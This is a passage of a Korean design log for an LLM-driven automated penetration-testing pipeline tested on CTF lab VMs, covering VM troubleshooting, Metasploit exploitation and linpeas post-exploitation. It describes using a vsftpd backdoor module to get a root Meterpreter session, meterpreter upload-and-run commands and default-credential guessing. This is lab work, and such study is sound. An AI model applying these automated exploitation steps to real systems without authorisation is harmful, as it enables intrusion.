  보여주고 "이게 실제로 성공(코드 실행/쉘/의도된 효과)한 걸로 보이는지" 판정하게
  한다 — 정규식으로 "성공 신호"를 정의하는 것보다, 임의의 익스플로잇 출력 형식을
  이해하는 데는 LLM이 훨씬 안정적이다. `vuln_analysis.py`와 같은 판정 패턴 재사용
  (LLM 호출 지점이 하나 더 늘어남 — DESIGN.md 3절 표에 반영 필요).
- 대상 하나 안에서는 순차 실행, 우선순위대로, 기본 stop-at-first-success, 실패도
  전부 findings에 기록 (DESIGN.md 5절 그대로).
- `exploit_target()` 진입 시 `env.provision_target.snapshot_before_exploit()` 호출.

### 알려진 한계: vuln_analysis가 못 잡는 취약점 종류
Kioptrix2의 실제 알려진 공격 경로는 웹 로그인 폼의 SQL 인젝션(CVE 매칭이 안 되는
애플리케이션 고유 로직 결함)인데, 지금 `vuln_analysis.py`는 searchsploit(버전
기반 CVE 매칭)만 하기 때문에 이런 종류의 취약점을 아예 후보로 못 만든다. 그래서
지금 이 파이프라인으로 찾은 후보들(CUPS/Apache DoS 계열)은 애초에 셸 획득으로
이어질 가능성이 낮다 — **이건 exploitation.py 구현의 문제가 아니라 vuln_analysis
단계의 커버리지 한계**다. 별도 확장 지점으로 `modules/web_exploit.py`를 스텁으로
남겨둔다(로그인 폼/파라미터에 대한 SQLi·커맨드 인젝션 등 능동 프로빙 — sqlmap
연동 등, 향후 작업).

## 20. env/health_check.py — 전반적인 환경 진단/트러블슈팅

이번 세션 내내 겪은 오류의 상당수가 코드 버그가 아니라 **VM 상태/연결성
불안정성**이었다 (사용자 관찰, 정확함): Kali가 하트비트 응답불능으로 죽음,
orphan guestcontrol 세션, 가상 네트워크 순간 패킷 손실, 세션 락 stuck. 이걸
개별적으로 그때그때 진단하는 대신, 한 번에 훑어보는 도구를 만들었다.

`env/health_check.py`가 점검하는 것: VM 상태(각 VM의 showvminfo, 타임아웃 걸어서
"멈춤 자체"도 진단 신호로 씀), guestcontrol 응답성, orphan 세션 개수, kali
가용 메모리/load(메모리 1.9GB로 빠듯해서 크래시 위험 임계치 감시), 대상
ping 도달성, `findings.jsonl`을 훑어서 종료 이벤트 없는 미완료 job(→
`job_runner.resume_job()`으로 이어서 확인 가능). `run_diagnosis(auto_fix=True)`
하나로 전부 점검 + 안전하게 자동 고칠 수 있는 것(VM 재기동, orphan 세션 정리)은
바로 고친다. `env/job_runner.py`의 `start_job()`이 매번 이걸 통해 사전 점검하도록
연결해서, "VM이 죽어있는 채로 명령을 시도해서 알 수 없는 에러가 남" 하는 경우를
막는다.

### 20-1. 세션 락 stuck — VBoxSVC까지 건드려야 했던 사례
실제로 겪은 가장 까다로운 경우: 백그라운드로 돌던 파이썬 스크립트를 강제
종료(TaskStop)했더니, `showvminfo kali`조차 응답 없이 멈춰버렸다(다른 VM인
Kioptrix2는 멀쩡했음 — kali 세션만 stuck). 복구 순서:
1. `controlvm kali poweroff` → 이건 성공(0~100%)했지만 `startvm`이 "already
   locked by a session"으로 계속 실패 — poweroff가 세션 락 자체를 못 풂.
2. VBoxSVC(호스트의 모든 VM 세션을 관리하는 백그라운드 서비스) 프로세스를 강제
   종료 → **부작용 발견**: kali뿐 아니라 멀쩡하던 Kioptrix2도 `list runningvms`에서
   사라짐(프로세스는 떠 있는데 VBoxManage가 세션을 못 찾는 상태) — VBoxSVC
   재시작은 호스트 전체의 VM 세션 추적에 영향을 준다.
3. 결국 두 VM의 `VBoxHeadless.exe`(+ suplib 자식 프로세스들, VM당 3개가 정상)를
   Windows에서 직접 `Stop-Process -Force`로 정리하고, `startvm`으로 둘 다
   재기동해서 해결.

`recover_locked_session()`은 이 경험을 반영해서 **1단계(poweroff)까지만
자동으로 하고, VBoxSVC 재시작은 자동으로 안 한다** — 블라스트 반경이 이 VM
하나가 아니라 호스트 전체이기 때문에, 그 이상은 사람이 판단해서 수동으로
하도록 안내만 출력한다.

## 20-2. Kioptrix1 서비스 소실 사고 — 정상 종료를 기본으로 전환

**증상**: Kioptrix1이 로그인 프롬프트까지는 정상 부팅되는데(콘솔 스크린샷으로
확인), SSH/Apache/Samba 등 네트워크 서비스가 하나도 안 뜬 상태가 됨. 전체 VM을
다 끄고 처음부터 재기동해도 재현됨. MAC 주소는 VirtualBox 설정과 실제 관측치가
일치해서(`08002774943D`) 인터페이스 이름이 바뀌는 문제(Kioptrix2에서 겪은 kudzu
류)는 아니었음.

**가장 유력한 원인**: 오늘 여러 차례의 트러블슈팅 과정에서 `VBoxManage controlvm
<vm> poweroff`(전원 플러그를 뽑는 것과 동일한 강제 종료)를 Kioptrix1에 반복
사용했다. 오래된 CTF 이미지는 저널링이 약한 파일시스템을 쓰는 경우가 많아서,
반복된 강제 종료가 커널/init 같은 핵심 부팅 파일은 안 건드렸지만 나중에
로드되는 네트워크 서비스 관련 파일/설정을 손상시켰을 가능성이 높다. 크레덴셜이
없어 게스트 내부(fsck, 로그)를 직접 확인할 수는 없어서 100% 확정은 못 했지만,
관찰된 증상과 정확히 들어맞는다.

**대응 (사용자 요청)**: `env/provision_target.py`에 `graceful_shutdown()`(ACPI
전원 버튼으로 정상 종료, 시간 안에 안 꺼지면 실패 반환), `force_poweroff()`
(마지막 수단), `shutdown_vm()`(정상 종료 시도 후 실패하면만 강제 종료로 폴백)을
추가했다. **앞으로 VM을 끌 때는 이 함수들을 통해서만 하고, `poweroff`를 직접
호출하지 않는다.** `rollback_to_snapshot()`과 `health_check.recover_locked_session()`도
이 순서(정상 종료 우선, 실패 시에만 강제)로 갱신했다 — 후자는 이미 VirtualBox
세션 자체가 응답 없는 상황이라 ACPI 신호도 안 먹힐 수 있어서 대기 시간을 짧게
두고, 그래도 안 되면 강제 종료로 넘어간다. (이 정상 종료 전환 자체는 좋은
개선이라 유지하지만, 아래처럼 "강제종료로 인한 손상" 가설 자체는 틀린 것으로
판명남 — 그래도 앞으로 반복 강제종료는 여전히 피하는 게 맞다.)

**가설 반증 + 진짜 원인 발견 (원본 rar로 재현 테스트)**: 원본
`Kioptrix_Level_1.rar`(`C:\Users\chuni\Downloads\`)에서 완전히 새로 압축을 풀어
(한 번도 강제종료된 적 없는 디스크로) 재임포트했는데 **동일한 증상이 재현됨**
(4분 이상 대기해도 서비스 없음) → 강제종료 손상 가설은 폐기.

사용자가 정확한 원인을 짚어줬다: **NIC 타입 문제**. VirtualBox가 새 어플라이언스
임포트 시 기본으로 붙이는 NIC이 Intel PRO/1000(e1000)인데, Kioptrix1은 2010년경
RHEL 2.4 커널 기반이라 e1000 드라이버가 없다 — 카드를 인식 못 해서 eth0가 아예
안 올라오고, 내부에서 Apache/Samba가 멀쩡히 떠 있어도 밖에서 도달 불가능한
상태가 된다. `VBoxManage modifyvm Kioptrix1 --nictype1 Am79C973`(PCnet-FAST III,
이 커널이 지원하는 구형 카드)로 변경 후 재부팅 → **하지만 이것도 4분 가까이
기다렸는데 여전히 포트가 하나도 안 열림** (2026-08-09 세션 종료 시점 기준,
`state/20260809-224152-kioptrix1-nic-fix-verify` 등 확인). NIC 타입 진단은
이론적으로 맞을 가능성이 높지만(원인으로 유력), **아직 최종 검증은 안 끝남** —
추가로 확인할 것: 어댑터 변경이 실제 게스트 안에서 새 하드웨어로 인식됐는지
(udev가 새 MAC/디바이스로 다시 초기화를 기다리고 있을 수 있음, 재부팅을 한 번
더 하거나 더 오래 기다려야 할 수도 있음), 또는 다른 원인이 겹쳐있을 가능성.

**현재 상태 (다음 세션에서 이어갈 것)**:
- Kioptrix1: NIC 타입은 Am79C973로 고쳐놓은 상태, 서비스 정상화는 미확인 (막힌 채로 세션 종료)
- Metasploit 검증 대상은 **Metasploitable2로 교체하기로 결정** (사용자 확인,
  SourceForge 공식 배포 https://sourceforge.net/projects/metasploitable/files/Metasploitable2/
  — 사용자가 `Metasploitable2-Linux.zip`을 `Downloads`에 받아주면 이어서
  압축해제 → import_target_vm() → 부팅 → exploitation.py의 Metasploit 경로
  실전 검증 진행)
- `exploitation.py`의 Metasploit 코드(`find_msf_module`/`run_msf_module`/
  `attempt_candidate`)는 작성 완료, import 테스트 통과, **아직 실제 대상으로
  end-to-end 검증 전** — Metasploitable2가 준비되면 이어서 진행
- msfconsole 자체는 정상 동작 확인됨 (18절)

## 20-3. 새 대상 VM 임포트 시 하드웨어 프로파일 확인 절차 (사용자 요청)

Kioptrix1의 NIC 문제(20-2절 — VirtualBox 기본 NIC인 e1000을 오래된 커널이
인식 못 해서 네트워크가 아예 안 붙었던 것)를 겪은 뒤, 앞으로 **새 CTF VM을
임포트할 때마다 매번 새로 판단하는 대신, 대상의 배포 연도에 맞는 하드웨어
프로파일을 절차적으로 고르도록** `env/provision_target.py`에
`HARDWARE_PROFILES` 테이블을 추가했다:

```python
HARDWARE_PROFILES = {
    "legacy":      TargetProfile(nictype="Am79C973"),  # ~2008년 이전 (Kioptrix1 등)
    "2008-2012":   TargetProfile(nictype="e1000"),       # Metasploitable2 등
    "modern":      TargetProfile(nictype="e1000"),       # 최신 배포판
}
```

**새 대상 임포트 전 체크리스트**:
1. 대상의 배포 연도/커널 세대를 짐작한다 (VulnHub 페이지 설명, vmx 파일의
   `guestOS` 필드, 파일명의 배포판/버전 등)
2. 애매하면 `"legacy"`(Am79C973)를 기본값으로 쓴다 - PCnet 드라이버는 리눅스
   커널 역사 전반에 걸쳐 거의 항상 지원되는 반면, e1000은 대략 2004년/커널
   2.6.5 이전 이미지엔 없을 수 있다. 안전한 쪽으로 기본값을 맞췄다
   (`TargetProfile()`의 기본 `nictype`도 `"Am79C973"`).
3. `import_target_vm(name, vmdk_path, profile=HARDWARE_PROFILES["legacy"])`
   식으로 명시적으로 골라서 쓰고, 어떤 프로파일을 왜 골랐는지 커밋/기록에
   남긴다 (지금은 DESIGN.md에 이렇게 남기는 게 "버전 관리"에 해당).

Metasploitable2는 이론적으로는 Ubuntu 8.04라 e1000도 지원하지만, 사용자가
검증된 `"legacy"`(Am79C973)를 그대로 쓰기로 결정 - 이미 이 호스트온리
네트워크에서 확실히 동작을 확인한 조합이라 불확실성을 줄이기 위함.

## 20-4. Metasploit 경로 실전 검증 성공 (Metasploitable2)

Kioptrix1 대신 Metasploitable2로 전환(20-3절) 후 exploitation.py의 Metasploit
경로가 완전히 성공했다: `exploit/unix/ftp/vsftpd_234_backdoor` 실행 →
**Meterpreter 세션을 root 권한으로 획득** (`meterpreter x86/linux root @
metasploitable.localdomain`) → LLM 판정 정확히 success(0.97). 후보 탐색 →
모듈 실행 → 세션 감지 → 성공 판정 전 과정 실증됨.

과정에서 잡은 버그 2개:
1. `find_msf_module()`가 CVE 검색 실패 시 서비스명("ftp")으로 폴백 검색하다가
   완전히 무관한 Windows 모듈을 골라 잘못 실행한 적이 있음(원인은 Kali가 막
   재기동된 직후라 msfconsole 호출이 일시적으로 실패했던 것으로 추정) - **서비스명
   폴백 자체를 제거**, CVE로 못 찾으면 None 반환 → PoC 스크립트 경로로 안전하게
   폴백.
2. `llm_client._call_via_api()`: 응답에 텍스트 블록이 전혀 없는 경우(전부
   thinking으로 끝남) `next()`가 `StopIteration`으로 크래시 - default=None +
   명시적 에러로 방어.

**알려진 남은 이슈 (다음에 고칠 것)**: `core/spend_tracker.py`의 `record()`가
파일 락 없이 read-modify-write 해서, `vuln_analysis.py`의 동시 worker
5개(ThreadPoolExecutor)가 동시에 기록할 때 일부 업데이트가 유실되는 경쟁
상태를 실측함(로그에서 누적 비용이 중간에 줄어드는 걸로 확인). 실제 과금
누락은 아니고(각 호출은 정상 과금됨) 상한 체크용 누적 총합만 부정확해질 수
있음 - 파일 락(filelock) 추가 필요.

## 20-5. 세션 락 반복 사고 — 크로스프로세스 파일 락 + 상시 모니터링 (사용자 요청)

세션 락(20-1절)이 이후로도 여러 번 재발했다. 근본 원인을 다시 보니: 호스트에서
강제종료 직후 orphan 세션이 남는 것 자체보다, **내가 서로 다른 별도 python
프로세스(백그라운드 태스크)를 여러 개 동시에 띄워서 Kali를 동시에 두드린 것**이
직접적인 방아쇠였다(e2e 파이프라인 + linpeas 다운로드 + health_check + 즉석
점검이 겹쳐서 실행됨). `threading.Lock`은 같은 프로세스 안에서만 작동해서 이
문제를 못 막는다 — 프로세스 경계를 넘는 락이 필요.

**적용한 조치**:
1. `env/guest_control.py`에 파일 기반 크로스프로세스 락(`_KaliSessionLock`,
   `state/_kali_session.lock`) 추가. `os.open(..., O_CREAT|O_EXCL)`로 원자적
   획득, PID+타임스탬프 기록. 180초 넘게 방치된 락은 죽은 프로세스가 남긴
   것으로 보고 자동 정리(stale-lock detection), 정상 락은 최대 90초 대기 후
   포기(`KaliLockTimeout`). `run_in_kali()`/`close_all_sessions()` 모두 이
   락으로 감쌌고, `kali_lock()`으로 다른 모듈(`health_check.py`)에도 공개해서
   `_vbm("guestcontrol", ...)` 같은 직접 호출도 같은 락을 타게 했다.
   post_exploit.py 검증 중 `env/job_runner.py`의 `start_job()`도 `guestcontrol
   start`를 락 없이 직접 호출하고 있던 걸 발견해서 같은 `kali_lock()`으로 감쌈
   (job 시작 자체는 논블로킹이라 락을 짧게만 잡음, 이후 폴링은 이미 `run_in_kali`
   경유라 자동으로 락을 탐).
2. **트레이드오프로 인지하고 있는 것**: `scanning.py`의 서비스별 서브모듈 5개
   동시 실행(`ThreadPoolExecutor`)도 이 락 때문에 Kali 쪽에서는 사실상 순차
   실행이 된다. 사용자가 명시한 우선순위("정확도 > 속도, 병렬은 선택사항이지
   지금 같은 사고를 감수할 이유는 아님")에 따라 의도적으로 받아들인 트레이드오프.
3. `env/health_check.py`에 `check_kali_lock()`/`lock_status()` 추가 —
   `HealthReport.kali_lock`에 `{locked, pid, age_seconds, stale}` 노출.
   `run_diagnosis()`가 매번 이걸 확인해서, stale이면 자동 정리, 30초 넘게
   사용 중이면 문제로 보고(정상 호출은 대개 수 초~수십 초 안에 끝나므로).
4. **상시 모니터링**: `env.health_check.watch(interval_seconds=60)` 추가 —
   `python -m env.health_check --watch [interval]`로 실행하면 락 상태/VM
   상태/orphan 세션을 주기적으로 계속 점검하고 출력한다. Ctrl+C로 중단.
   watch 자체도 guestcontrol을 호출하므로 같은 락을 타서 다른 작업과 안전하게
   순서를 나눠 쓴다 — interval을 너무 짧게 잡으면 다른 작업의 락 대기 시간만
   늘어나므로 기본 60초로 넉넉하게 잡음.

**추가 보강(같은 날, post_exploit.py 검증 도중 발견)**: `ensure_kali_running()`이
VM 상태만 "running"이면 바로 True를 반환해서, VM은 떠 있는데 게스트(Guest
Additions)가 응답 없는 경우(실제로 겪음 - showvminfo는 정상인데 run_in_kali가
계속 타임아웃)를 못 잡았다. `_restart_kali()`(정상종료 후 재기동, 이미 꺼져
있으면 그냥 켜기만 함 - `shutdown_vm()`이 알아서 스킵)로 통합해서, "꺼져 있음"과
"떠 있는데 응답 없음" 둘 다 같은 복구 경로를 타게 했다. `run_diagnosis()`도
게스트 응답 없음을 보고만 하고 멈추던 걸 `_restart_kali()`로 자동 복구 시도
하도록 바꿈. `check_target_reachability()`에도 재시도(기본 3회, 5초 간격)를
추가해서 VirtualBox 네트워크의 순간적 패킷 손실을 "연결 끊김"으로 바로 단정하지
않게 함(scanning.py의 거짓음성 재시도와 같은 패턴).

## 21. post_exploit.py 실전 검증 성공 (Metasploitable2)

`run_linpeas_via_msf_session()`이 미검증 상태였는데, Metasploitable2를 여러 번
재부팅해가며(vsftpd 백도어는 한 번 트리거되면 재부팅 전까지 재실행이 막힘)
실전 테스트로 버그 5개를 순서대로 잡아 최종적으로 **linpeas 전체 출력
554,774자를 온전히 캡처하고, LLM 권한상승 후보 분석까지 정확하게 성공**시켰다
(Ubuntu 8.04 hardy/커널 2.6.24 기반 커널 익스플로잇, AppArmor 미적용, 하드닝
부재 등 실제 linpeas 근거를 인용한 타당한 후보 5개 도출 확인).

잡은 버그들(전부 msfconsole `-x` 스크립팅 + meterpreter 특유의 함정):
1. **bash 따옴표 중첩**: `execute -f /bin/bash -a "/tmp/linpeas.sh -a"`처럼
   공백 있는 인자에 큰따옴표를 썼는데, 이걸 감싸는 bash `-x "..."` 큰따옴표
   안에 이스케이프 없이 중첩시켜서 bash가 `-x` 인자를 중간에 끊어버림 ->
   msfconsole 자체가 "Invalid command line option"으로 죽음. 공백 없는 인자만
   쓰도록 설계를 바꿔서 근본적으로 회피.
2. **`sessions -c` vs `-C`**: 소문자 `-c`는 세션에 **타겟 OS 셸 명령**을 그대로
   실행하는 옵션이라 `upload`/`execute` 같은 meterpreter 콘솔 명령을 넣으면
   `/bin/sh: upload: command not found`로 실패. meterpreter 콘솔 명령에는
   **대문자 -C** 필요.
3. **채널 번호 추측의 근본적 한계**: `execute -c`(channelized)로 연 채널을
   `read -c 1`로 읽으려 했는데 실제 채널 번호는 2였음(업로드가 내부적으로
   채널을 쓰는 듯). msfconsole -x 스크립트는 조건문/변수가 없어 앞 명령
   출력을 파싱해 다음 명령에 넣을 방법이 없으므로, 채널 번호 추측 자체가
   설계상 깨지기 쉬움 -> **접근을 통째로 변경**: linpeas 결과를 타겟 파일로
   리다이렉트하고 meterpreter `download`로 Kali 로컬 파일로 받은 뒤
   msfconsole 밖에서 평범하게 읽는 방식으로 전환.
4. **업로드된 스크립트 실행권한 없음**: `execute -f /tmp/linpeas.sh`로 직접
   실행하면 meterpreter upload가 실행 비트를 안 붙여줘서 "Permission denied".
   `bash /tmp/linpeas.sh`로 감싸서 실행권한 불필요하게 만듦.
5. **`download` 목적지 처리 방식**: 이 Metasploit 버전은 목적지 경로가 없으면
   무조건 디렉터리로 만들어서 그 안에 원격 파일명 그대로 저장한다(목적지를
   파일로 미리 만들어두면 오히려 "File exists @ dir_s_mkdir"로 실패). 목적지를
   **디렉터리로 미리 만들어두고** 안의 파일을 읽도록 수정.
6. **세션 종료 시 자식 프로세스 정리**: 처음엔 linpeas를 포그라운드로 그냥
   실행했는데, 배너/광고 박스만 찍히고 실제 점검 없이 끊김(msfconsole
   `exit -y`로 세션이 정리될 때 아직 안 끝난 자식 프로세스까지 같이 죽는 것으로
   추정). `nohup ... & disown -a`로 세션 프로세스 그룹에서 완전히 떼어내서
   msfconsole이 먼저 종료돼도 linpeas가 계속 돌도록 수정, sleep도 30초 ->
   60초로 늘림.
7. (부수적) linpeas 기본 출력의 ANSI 색상 코드가 LLM 분석에 노이즈가 되므로
   `sed -r 's/\x1b\[[0-9;]*[a-zA-Z]//g'`로 타겟 쪽에서 미리 제거.

교훈: msfconsole `-x`/meterpreter `sessions -C`를 조합해 스크립팅할 때는
"명령 하나하나가 실전에서 그대로 동작할 것"이라고 가정하지 말고, 값싼 대상
VM(Metasploitable2)에 대고 반드시 실측 확인할 것 - 오늘만 관련 버그 6개를
순서대로 실측으로 잡음.

## 21-1. flag_capture.py 구현 + 실전 검증 (post_exploit.py 교훈 선반영)

21절에서 실측으로 잡은 패턴(따옴표 중첩 회피, `sessions -c`/`-C` 구분,
`nohup ... & disown -a`로 세션 종료 시 자식 프로세스 정리 문제 회피, `download`
목적지를 디렉터리로 미리 만들어두기)을 **처음부터 반영**해서 `flag_capture.py`를
작성했더니 재작업(reboot-and-retry) 없이 첫 실행에 성공했다. Metasploitable2
대상 실전 검증: flag 파일이 없는 이미지라 "찾음 0개"가 정상 결과이고, 에러 없이
깨끗하게 완료됨을 확인. 파싱 로직(`_parse_flags`)은 합성 다중 flag 입력으로
별도 단위 검증(VM 없이 즉시 확인 가능하므로 재부팅 사이클 절약).

알려진 한계: 정확한 파일명 목록(`FLAG_FILENAMES`)만 찾고 와일드카드는 안 씀
(따옴표 중첩 위험 회피 목적, 모듈 docstring 참고) - 이름이 특이한 flag는 놓칠
수 있음.

## 21-2. reporting.py 구현 + 실전 검증

findings.jsonl/credentials.jsonl을 킬체인 순서(recon -> scanning ->
vuln_analysis -> exploitation -> post_exploit -> flag_capture -> credentials)
Markdown으로 조립한다. 다른 모듈과 달리 **LLM 호출이 전혀 없음** - 이미
구조화된 데이터를 그대로 조합하는 순수 변환이라 불필요. 데이터 없는 스테이지는
섹션째로 건너뛰어서 파이프라인이 어디까지 진행됐든 항상 읽을 수 있는 보고서가
나오게 함.

VM/Kali 접속이 전혀 필요 없어서(로컬 파일만 읽음) 오늘 세션 중 실제로 쌓인
과거 인게이지먼트 데이터(`20260809-233332-msf2-e2e` - scanning/vuln_analysis/
exploitation 3단계 혼합, `20260810-024454-post-exploit-verify9` - post_exploit
단계만)로 재부팅 없이 즉시 검증 완료. `templates/` 디렉터리는 결국 안 씀(빈
디렉터리) - 템플릿 엔진 없이 f-string으로 직접 조립하는 게 이 코드베이스
스타일과 더 일관적이라 판단.

**아직 검증 안 된 부분**: 이 락이 실제 세션 락 재발을 막는지는 다음번에 여러
백그라운드 작업이 겹칠 때 실증 필요. 또한 지금 이 변경 직후 `run_in_kali("true")`
호출이 20초 타임아웃됨(VM 상태는 running, showvminfo는 정상 응답 — 즉
VirtualBox 세션 락은 아니고 게스트 애디션 쪽 응답 지연/불능으로 추정)을
확인했다 — 락 코드 자체의 버그인지 게스트 쪽 일시적 문제인지 다음 턴에 계속
확인 중.

## 22. 현재 세션 상태 요약 (컨텍스트 압축용, 2026-08-09 작성)

### 구현 완료 (실전 검증됨)
- **env/**: provision_network(랩 네트워크), provision_target(VM 임포트/기동/스냅샷/**정상종료 우선** shutdown_vm), guest_control(Kali 명령 실행), job_runner(장시간 명령 watchdog), health_check(환경 진단+자동복구), host_power(호스트 절전 전 VM 안전 일시정지), check_api_key
- **core/**: engagement, state_store(findings.jsonl/credentials.jsonl), config(.env 로드+UTF-8 stdout, **모든 모듈이 import 필수**), llm_client(구독 우선+API 폴백), llm_guard, spend_tracker
- **modules/**: recon, scanning(2단계 nmap+거짓음성 재시도), vuln_analysis(searchsploit+LLM 판정), exploitation(PoC 스크립트 + Metasploit 경로, LLM 성공판정) — 전부 Kioptrix2 대상으로 end-to-end 검증됨(스캔→분석→익스플로잇 시도, MSF 매칭 후보는 없었음)
- **스텁만**: ad_enum, shell_manager, lateral_movement, sniffing, post_exploit, flag_capture, reporting, web_exploit, knowledge_base

### 지금 막힌 것: Kioptrix1이 네트워크 서비스를 전혀 노출 안 함
- msfconsole 자체는 고쳐서 정상 동작(18절) — Kioptrix2엔 매칭 CVE 모듈이 없어서, trans2open이 있는 **Kioptrix1로 exploitation.py의 MSF 경로를 실전 검증**하려 했음
- 증상: OS는 로그인 프롬프트까지 정상 부팅(콘솔 확인됨), ping/ARP는 응답, **but SSH/Apache/Samba 등 전 포트가 항상 closed**
- 시도했지만 원인이 아니었던 것: (1) 반복 강제종료로 인한 손상 — 원본 rar에서 완전히 새로 압축 풀어 재임포트해도 동일 재현, 기각. (2) NIC 타입(82540EM, 옛날 커널이 드라이버 없음) — 사용자가 정확히 짚어서 Am79C973으로 고쳤으나(진짜 버그였음, provision_target.py는 아직 NIC 타입을 명시 안 해서 향후 임포트에도 재발 가능 — **TODO: import_target_vm에 --nictype1 명시 필요**), 그래도 여전히 서비스 없음(3분45초 대기 확인)
- 콘솔 크레덴셜 추측(root/root, root/toor, root/빈값, root/kioptrix) 전부 실패 — 더 이상 시도 안 함
- **미해결 상태로 보류 중**. 다음 조치 후보: (a) Metasploitable2로 교체(사용자가 SourceForge에서 다운로드하기로 함, 아직 안 받음) (b) vmdk를 호스트에서 직접 마운트해서 부팅 스크립트 검사 (c) 포기하고 Kioptrix2만으로 코드 로직 검증

### 다음 할 일 (순서)
1. Kioptrix1 문제 결론짓기 (Metasploitable2 다운로드 대기 중이거나, 포기 결정)
2. exploitation.py의 Metasploit 경로(find_msf_module/run_msf_module) 실제 세션 획득까지 실전 검증
3. post_exploit.py 구현 (권한상승, linpeas/winPEAS + LLM 판정 — vuln_analysis/exploitation과 같은 패턴 재사용)
4. flag_capture.py, reporting.py 순서로 스텁 해제

### 반복해서 겪은 운영 교훈 (요약, 상세는 각 절 참고)
- VM은 항상 죽을 수 있다는 전제로 코드 짤 것 — health_check.py로 사전 점검 습관화 (job_runner.start_job()은 이미 자동 적용)
- `poweroff` 직접 호출 금지, `shutdown_vm()`/`graceful_shutdown()` 사용 (20-2절)
- 새 모듈 만들 때 `from core import config` 빠뜨리면 한글 print에서 UnicodeEncodeError (13절)
- VBoxManage 결과는 exit code만 보지 말고 실제 메시지 확인할 것("정상인데 exit 1"인 경우 여럿 있었음 — snapshot list 없음, 등)
- 즉석 명령(`python -c`, PowerShell)보다 우리가 만든 도구(scanning.py, health_check.py 등)를 쓸 것 (사용자 피드백)

## 23. 결정 로그

| 날짜 | 결정 | 상태 |
|---|---|---|
| 2026-08-08 | 독립 프로그램 + 순수 Anthropic Messages API (MCP/Agent SDK 안 씀) | 확정 |
| 2026-08-08 | RAG는 인터페이스만 선구축, 구현은 나중 | 확정 |
| 2026-08-08 | 플랫폼/타겟개수 자동 감지 (사용자 사전 지정 없음) | 확정 |
| 2026-08-08 | AD/멀티호스트 지원을 스텁에서 MVP로 승격 | 확정 |
| 2026-08-08 | 공용 상태 인프라(`core/`) 먼저 구현 후 Linux 파이프라인 구현 순서로 진행 | 확정 |
| 2026-08-08 | credentials.jsonl도 findings.jsonl과 같은 순수 append-only 이벤트 로그로 설계 변경 (최초안: `validated_on` 덮어쓰기) | 확정, 구현됨 |
| 2026-08-09 | `run_in_kali()` 타임아웃 시 orphan 게스트 세션 자동 정리(`close_all_sessions()`) 추가 (11절 참고) | 확정, 구현됨 |
| 2026-08-09 | 장시간 명령을 `guestcontrol start`+폴링으로 감시하는 `env/job_runner.py` 추가 (12절) | 확정, 구현됨 |
| 2026-08-09 | nmap 전체 포트 스캔을 discovery(-sV)/script(-sC) 2단계로 분리 + "0 hosts up" 거짓음성 재시도 로직 추가 | 확정, 구현됨 |
| 2026-08-09 | vuln_analysis.py 구현: searchsploit(결정론적) + Claude API worker/supervisor 판정, Kioptrix2 실전 검증 완료 | 확정, 구현됨 |
| 2026-08-09 | env/ 전체 subprocess.run 호출에 encoding="utf-8" 명시 (13절) | 확정, 구현됨 |
| 2026-08-09 | API 키를 .env 파일로 관리 (core/config.py가 로드), 채팅으로 전달 금지 | 확정, 구현됨 |
| 2026-08-09 | LLM 호출 안전장치(core/llm_guard.py): 동시 5개, 실행당 상한 50, 입력 크기 상한. worker 모델은 Sonnet 5 유지 | 확정, 구현됨 |
| 2026-08-09 | 세션 락 재발 방지: guest_control.py에 크로스프로세스 파일 락 추가(모든 guestcontrol 호출 직렬화), health_check.py에 락 상태 체크 + watch() 상시 모니터링 추가 (20-5절) | 확정, 구현됨 - 재발 방지 실효성은 다음 실전에서 검증 필요 |
| 2026-08-09 | Claude Pro/Max 구독 우선 사용 + 한도 도달 시 API 자동 폴백(core/llm_client.py, 16절). vuln_analysis.py를 tool_choice 강제 방식에서 프롬프트 JSON 파싱 방식으로 전환 | 확정, 구현됨 |
| 2026-08-09 | 종량제 전환 시 콘솔 경고 + 지출 상한($5, .env의 MAX_API_SPEND_USD) 하드 스톱(core/spend_tracker.py). 상한은 "구독 막힌 구간당 예산"으로 구독 리셋 시 초기화 (16-1절) | 확정, 구현됨 |
| 2026-08-09 | exploitation.py는 일단 Metasploit 없이 진행 (msfconsole이 이 VM에서 bootsnap 관련 에러로 시작 안 됨 - VM 한정 이슈로 추정, 18절). PoC 스크립트 실행 + LLM 성공판정 방식으로 구현. 이후 이 VM에서 Metasploit 자체를 고쳐서 RPC 경로 추가 예정 | 확정, 구현됨(Metasploit 제외, 추가 예정) |
| 2026-08-09 | scanning.py의 PORT_LINE_RE 버그 수정: `\s+`가 개행을 먹어서 배너 없는 포트가 다음 줄 전체를 삼키던 것을 `[ \t]+`로 교체 | 확정, 구현됨 |
| 2026-08-09 | snapshot_before_exploit(): "스냅샷 없음"이 exit code 1로 나오는 걸 진짜 에러와 구분하도록 수정 | 확정, 구현됨 |
| 2026-08-09 | vuln_analysis._judge_all(): worker 하나의 JSON 파싱 실패가 전체를 죽이지 않도록 개별 예외 처리 + max_tokens 1024->2048 상향(잘림 방지) | 확정, 구현됨 |
| 2026-08-09 | env/health_check.py 추가: VM 상태/guestcontrol 응답성/orphan 세션/메모리/대상 도달성/미완료 job을 한 번에 진단. job_runner.start_job()이 사전 점검으로 사용 (20절) | 확정, 구현됨 |
| 2026-08-09 | msfconsole 수정 완료 (mysql/ssl 디렉터리 chmod + llvm-21의 자기참조 심볼릭 링크 제거). Metasploit 없이 진행하기로 한 결정 뒤집음, exploitation.py에 Metasploit 실행 경로(find_msf_module/run_msf_module) 작성 완료 (18절) | 확정, 구현됨(실전 검증은 진행 중) |
| 2026-08-09 | Kioptrix1 반복 강제종료로 서비스가 소실된 것으로 추정되는 사고 이후, VM 종료는 항상 정상 종료(ACPI) 우선 + 실패 시에만 강제 종료로 전환. `provision_target.graceful_shutdown/force_poweroff/shutdown_vm` 추가, `poweroff` 직접 호출 금지 (20-2절) | 확정, 구현됨 |
| 2026-08-09 | post_exploit.py 실전 검증 완료, 버그 6개 수정 (21절) | 확정, 구현됨 |
| 2026-08-09 | flag_capture.py 구현 - post_exploit.py의 검증된 패턴을 선반영해서 재작업 없이 첫 실행 성공 (21-1절) | 확정, 구현됨 |
| 2026-08-09 | reporting.py 구현 - LLM 호출 없이 findings를 킬체인 순서 Markdown으로 조립, 과거 실제 인게이지먼트 데이터로 검증 (21-2절). MVP 7단계(recon~reporting) 전부 구현 완료 | 확정, 구현됨 |
| 2026-08-09 | env/host_power.py에 hold()/resume() 추가 (홀드 시점 미완료 job 기록, 재개 시 health_check로 재검증) | 확정, 구현됨 |
| 2026-08-09 | linpeas는 noisy해서 기본값 유지, "조용한 열거" 대안은 나중에 - 구조만 남겨둠 (24절) | TODO, 구조만 |
